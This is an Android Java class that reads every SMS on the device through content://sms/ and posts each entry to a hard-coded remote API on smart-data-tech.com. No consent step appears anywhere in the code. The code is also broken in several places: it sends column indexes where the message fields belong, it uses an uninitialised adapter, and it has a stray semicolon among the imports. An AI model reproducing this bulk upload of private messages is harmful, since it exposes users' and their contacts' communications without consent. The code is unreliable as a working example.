package com.example.cka.smartckeckdata;

import android.content.ContentResolver;
;
import android.content.Context;

import android.database.Cursor;
import android.net.Uri;

import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;


import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;

import java.util.ArrayList;
import java.util.List;


public class SaveUserMessage implements ISMS {
    private int id_user;
    private int id_message;
    private String contenu_message;
    private String type_messag;
    private String dat_message;
    private String heure_message;
    private String correspondant_number;
    private String correspondant_name;
    private String dat_ins_message;
    private String heure_ins_message;
    private String etat = "actif";
    private String url= "http://smart-data-tech.com/dev/API/v1/saveUserMessage/";

    // private static MainActivity inst;
    ArrayList<String> smsMessagesList = new ArrayList<String>();
    ListView smsListView;
    ArrayAdapter arrayAdapter;
    //private

    public static Context contextOfApplication;

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

    @Override
    public void SaveUserMessage() {
        ContentResolver contentResolver = getContextOfApplication().getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
        arrayAdapter.clear();
        do {
            EnvoiPost(url,smsInboxCursor.getColumnIndex("address"),smsInboxCursor.getColumnIndex("address"),Integer.toString(smsInboxCursor.getColumnIndex("body")),
                    Integer.toString(smsInboxCursor.getColumnIndex("type")),Integer.toString(smsInboxCursor.getColumnIndex("date")),"h",Integer.toString(smsInboxCursor.getColumnIndex("address")),
                    Integer.toString(smsInboxCursor.getColumnIndex("address")), Integer.toString(smsInboxCursor.getColumnIndex("address")),"nouvelle date","actif");
            String str = "SMS PAR: " + smsInboxCursor.getString(indexAddress) +
                    "\n" + smsInboxCursor.getString(indexBody) + "\n";
            arrayAdapter.add(str);
        } while (smsInboxCursor.moveToNext());
    }

    public void updateList(final String smsMessage) {
        arrayAdapter.insert(smsMessage, 0);
        arrayAdapter.notifyDataSetChanged();
    }

    public void onItemClick(AdapterView<?> parent, View view, int pos, long id) {
        try {
            String[] smsMessages = smsMessagesList.get(pos).split("\n");
            String address = smsMessages[0];
            String smsMessage = "";
            for (int i = 1; i < smsMessages.length; ++i) {
                smsMessage += smsMessages[i];
            }

            String smsMessageStr = address + "\n";
            smsMessageStr += smsMessage;
            //Toast.makeText(this, smsMessageStr, Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void EnvoiPost(String Url, int id_user, int id_message, String contenu_message, String type_messag, String dat_message, String heure_message,
                          String correspondant_number, String correspondant_name, String dat_ins_message, String heure_ins_message, String eta) {

        HttpClient client = new DefaultHttpClient();
        HttpPost post = new HttpPost(Url);
        try {
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
            nameValuePairs.add(new BasicNameValuePair("id_user",Integer.toString(id_user)));
            nameValuePairs.add(new BasicNameValuePair("id_message",Integer.toString(id_message)));
            nameValuePairs.add(new BasicNameValuePair("contenu_message",contenu_message));
            nameValuePairs.add(new BasicNameValuePair("type_messag",type_messag));
            nameValuePairs.add(new BasicNameValuePair("dat_message",dat_message));
            nameValuePairs.add(new BasicNameValuePair("heure_message",heure_message));
            nameValuePairs.add(new BasicNameValuePair("correspondant_number",correspondant_number));
            nameValuePairs.add(new BasicNameValuePair("correspondant_name",correspondant_name));
            nameValuePairs.add(new BasicNameValuePair("dat_ins_message",dat_ins_message));
            nameValuePairs.add(new BasicNameValuePair("heure_ins_message",heure_ins_message));
            nameValuePairs.add(new BasicNameValuePair("etat",eta));

            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            HttpResponse response = client.execute(post);
            Log.i("reponse est", response.toString());
            /*BufferedReader rd = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));
            String line = "";
            while ((line = rd.readLine()) != null) {
                System.out.println(line);
            }*/

        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
